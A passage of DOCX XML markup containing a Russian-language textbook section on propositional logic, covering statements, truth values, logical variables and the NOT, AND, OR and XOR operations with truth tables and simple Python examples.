    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Истинность или ложность должна быть определённой, а не субъективной</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Примеры высказываний:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">✅ </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>"Москва — столица России"</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это высказывание (истинное)  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">✅ </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>"2 + 2 = 5"</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это высказывание (ложное)  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">✅ </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>"Все собаки умеют летать"</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это высказывание (ложное)  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">✅ </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>"Существует планета за орбитой Плутона"</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это высказывание (может быть проверено)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Примеры НЕ высказываний:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">❌ </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>"Который час?"</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — вопрос, а не утверждение  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">❌ </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>"Закройте окно!"</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — приказ, а не утверждение  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">❌ </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>"Этот фильм красивый"</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — субъективное мнение, нельзя однозначно определить истинность  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">❌ </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>"Х &gt; 5"</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — неопределённость, зависит от значения X (это предикат, а не высказывание)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Логические значения</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>В алгебре высказываний используются только два логических значения:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Истина (True, 1, И)** — высказывание истинно</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Ложь (False, 0, Л)** — высказывание ложно</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Обозначения в разных контекстах:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>| Контекст              | Истина      | Ложь        |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>|-----------------------|-------------|-------------|</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| Математическая логика | И, True, T  | Л, False, F |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| Программирование      | true, 1     | false, 0    |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| Электроника           | 1, высокий  | 0, низкий   |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| Булева алгебра        | 1           | 0           |</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>В дальнейшем мы будем использовать обозначения 1 (истина) и 0 (ложь), так как это наиболее универсальная запись.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Логические переменные</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Логическая переменная</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это переменная, которая может принимать только одно из двух значений: истина (1) или ложь (0).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Обычно логические переменные обозначаются заглавными латинскими буквами: A, B, C, X, Y, Z.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Примеры:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Пусть A = "Сегодня идёт дождь"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Пусть B = "Завтра будет солнечно"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A может быть равно 1 (если действительно идёт дождь) или 0 (если не идёт)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Логические операции (функции)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Логическая операция</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это действие над одним или несколькими высказываниями, результатом которого является новое высказывание.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Основные логические операции:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**НЕ (отрицание, инверсия)** — унарная операция (над одним операндом)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**И (конъюнкция, логическое умножение)** — бинарная операция</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**ИЛИ (дизъюнкция, логическое сложение)** — бинарная операция</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Исключающее ИЛИ (XOR, сложение по модулю 2)** — бинарная операция</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Импликация (следование)** — бинарная операция</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Эквивалентность (равнозначность)** — бинарная операция</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Далее мы подробно рассмотрим каждую из этих операций.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Базовые логические операции</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Операция НЕ (отрицание, инверсия)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Отрицание (НЕ, NOT, инверсия)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — унарная операция, которая меняет значение высказывания на противоположное.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Обозначения:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>¬A (в математической логике)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>NOT A (в программировании)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Ā или A' (в булевой алгебре)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>!A (в языках программирования типа C, Java, JavaScript)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Таблица истинности для операции НЕ:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>| A | ¬A |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>|---|---|</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 0 | 1 |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 1 | 0 |</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Смысл:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> если A истинно, то ¬A ложно, и наоборот.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Примеры:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A = "Идёт дождь" (истина)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>¬A = "Не идёт дождь" (ложь)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>В программировании:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>A = True</w:t>
        <w:br/>
        <w:t>not_A = not A  # not_A = False</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Свойства отрицания:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Двойное отрицание:** ¬(¬A) = A (отрицание отрицания возвращает исходное значение)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Инволютивность:** применение операции дважды возвращает к исходному</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Операция И (конъюнкция, логическое умножение)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Конъюнкция (И, AND, логическое умножение)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — бинарная операция, результат которой истинен только тогда, когда истинны оба операнда.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Обозначения:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A ∧ B (в математической логике)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A AND B (в программировании)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A · B или AB (в булевой алгебре, как обычное умножение)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A &amp;&amp; B (в языках C, Java, JavaScript)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Таблица истинности для операции И:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>| A | B | A ∧ B |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>|---|---|-------|</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 0 | 0 | 0     |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 0 | 1 | 0     |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 1 | 0 | 0     |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 1 | 1 | 1     |</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Смысл:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> результат истинен (1) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>только</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> когда </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>оба</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> операнда истинны.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Аналогия из жизни:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">"Я пойду в кино, если у меня будут деньги </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>И</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> будет свободное время"  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Пойду в кино только если выполнены ОБА условия.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Примеры:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A = "Сегодня суббота" (истина)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>B = "Погода хорошая" (истина)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A ∧ B = "Сегодня суббота и погода хорошая" (истина)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>В программировании:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>temperature = 25</w:t>
        <w:br/>
        <w:t>sunny = True</w:t>
        <w:br/>
        <w:t>good_weather = (temperature &gt; 20) and sunny  # True</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Свойства конъюнкции:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Коммутативность:** A ∧ B = B ∧ A (порядок операндов не важен)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Ассоциативность:** (A ∧ B) ∧ C = A ∧ (B ∧ C)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Идемпотентность:** A ∧ A = A</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Нейтральный элемент:** A ∧ 1 = A</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Поглощающий элемент:** A ∧ 0 = 0 (если хоть один операнд ложен, результат ложен)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Операция ИЛИ (дизъюнкция, логическое сложение)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Дизъюнкция (ИЛИ, OR, логическое сложение)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — бинарная операция, результат которой истинен, когда истинен хотя бы один из операндов.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Обозначения:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A ∨ B (в математической логике)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A OR B (в программировании)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A + B (в булевой алгебре, как обычное сложение)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A || B (в языках C, Java, JavaScript)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Таблица истинности для операции ИЛИ:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>| A | B | A ∨ B |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>|---|---|-------|</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 0 | 0 | 0     |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 0 | 1 | 1     |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 1 | 0 | 1     |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 1 | 1 | 1     |</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Смысл:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> результат истинен (1), когда истинен </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>хотя бы один</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> операнд (или оба).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Аналогия из жизни:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">"Я возьму зонт, если будет дождь </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>ИЛИ</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> сильный ветер"  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Возьму зонт, если выполнено ХОТЯ БЫ ОДНО условие (или оба).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Примеры:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A = "У меня есть машина" (ложь)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>B = "Я могу взять такси" (истина)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A ∨ B = "У меня есть машина или я могу взять такси" (истина — достаточно одного способа добраться)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>В программировании:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>is_weekend = True</w:t>
        <w:br/>
        <w:t>is_holiday = False</w:t>
        <w:br/>
        <w:t>can_rest = is_weekend or is_holiday  # True</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Свойства дизъюнкции:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Коммутативность:** A ∨ B = B ∨ A</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Ассоциативность:** (A ∨ B) ∨ C = A ∨ (B ∨ C)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Идемпотентность:** A ∨ A = A</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Нейтральный элемент:** A ∨ 0 = A</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Поглощающий элемент:** A ∨ 1 = 1 (если хоть один операнд истинен, результат истинен)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Операция Исключающее ИЛИ (XOR)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Исключающее ИЛИ (XOR, сложение по модулю 2)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — бинарная операция, результат которой истинен, когда операнды имеют </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>различные</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> значения.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Обозначения:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A ⊕ B (в математической логике)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A XOR B (в программировании)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A ⊕ B (в булевой алгебре)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A ^ B (в некоторых языках программирования)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Таблица истинности для операции XOR:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>| A | B | A ⊕ B |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>|---|---|-------|</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 0 | 0 | 0     |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 0 | 1 | 1     |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 1 | 0 | 1     |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 1 | 1 | 0     |</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Смысл:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> результат истинен (1), когда операнды </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>различны</w:t>
      </w:r>
      <w:r>
        <w:t>. Если оба операнда одинаковы (оба истинны или оба ложны), результат ложен.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Отличие от обычного ИЛИ:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Обычное ИЛИ даёт 1 при A=1, B=1  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Исключающее ИЛИ даёт 0 при A=1, B=1</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Аналогия из жизни:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">"В ресторане на выбор: десерт </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>ИЛИ</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> кофе (что-то одно, не оба сразу)"  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Это исключающее ИЛИ — можно выбрать только один вариант.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Примеры:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A = "Включен свет №1" (истина)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>B = "Включен свет №2" (ложь)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A ⊕ B = "Включен ровно один свет" (истина)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Применение в технике:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
